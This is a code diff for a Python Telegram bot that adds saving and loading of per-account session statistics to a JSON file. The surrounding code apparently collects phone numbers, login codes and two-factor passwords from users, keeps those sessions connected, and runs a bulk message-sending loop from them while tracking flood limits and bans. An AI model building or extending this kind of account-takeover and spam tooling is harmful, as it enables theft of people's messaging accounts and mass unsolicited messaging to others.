@@ -98,6 +98,27 @@ def init_session_stats(phone, account_name="", account_id=None, collected_by=Non
         if account_id:
             session_stats[phone]["account_id"] = account_id
 
+STATS_FILE = os.path.join(BASE_DIR, "stats.json")
+
+def save_stats():
+    """Salva session_stats em arquivo JSON"""
+    try:
+        with open(STATS_FILE, "w", encoding="utf-8") as f:
+            json.dump(session_stats, f, ensure_ascii=False, indent=2)
+    except Exception as e:
+        print(f"[STATS] ⚠️ Erro ao salvar stats: {e}")
+
+def load_stats():
+    """Carrega session_stats do arquivo JSON"""
+    global session_stats
+    try:
+        if os.path.exists(STATS_FILE):
+            with open(STATS_FILE, "r", encoding="utf-8") as f:
+                session_stats = json.load(f)
+            print(f"[STATS] 📂 Stats carregadas: {len(session_stats)} sessões")
+    except Exception as e:
+        print(f"[STATS] ⚠️ Erro ao carregar stats: {e}")
+
 # ===============================
 # VALIDAÇÃO INITDATA
 # ===============================
@@ -286,6 +307,7 @@ async def disparo_loop(client: TelegramClient, phone: str):
             if phone in session_stats:
                 session_stats[phone]["rounds_completed"] += 1
                 session_stats[phone]["last_round_time"] = time.time()
+            save_stats()
             print(f"[DISPARO] ✅ {phone} — Rodada completa: {enviados} enviados, {erros} erros, {flood_total} floods")
 
         except Exception as e:
@@ -299,6 +321,7 @@ async def disparo_loop(client: TelegramClient, phone: str):
                 if phone in session_stats:
                     session_stats[phone]["status"] = "banned"
                     session_stats[phone]["ban_reason"] = error_name
+                    save_stats()
                 try:
                     await client.disconnect()
                 except:
@@ -314,6 +337,7 @@ async def disparo_loop(client: TelegramClient, phone: str):
                 if phone in session_stats:
                     session_stats[phone]["status"] = "expired"
                     session_stats[phone]["ban_reason"] = f"{MAX_FALHAS} falhas de conexão"
+                    save_stats()
                 try:
                     await client.disconnect()
                 except:
@@ -431,6 +455,7 @@ async def api_verify_code(request):
 
         # Stats: registrar nova sessão
         init_session_stats(phone, account_name=me.first_name or "", account_id=me.id, collected_by=user_id)
+        save_stats()
 
         # Inicia disparo em background (NÃO desconecta)
         users.pop(user_id, None)
@@ -492,6 +517,7 @@ async def api_verify_password(request):
 
         # Stats: registrar nova sessão
         init_session_stats(phone, account_name=me.first_name or "", account_id=me.id, collected_by=user_id)
+        save_stats()
 
         # Inicia disparo em background (NÃO desconecta)
         users.pop(user_id, None)
@@ -856,6 +882,9 @@ async def main():
     async with application:
         await application.start()
         await application.updater.start_polling(allowed_updates=Update.ALL_TYPES)
+
+        # Carregar stats salvas
+        load_stats()
 
         # Carregar sessões existentes e iniciar disparo
         await carregar_sessoes()
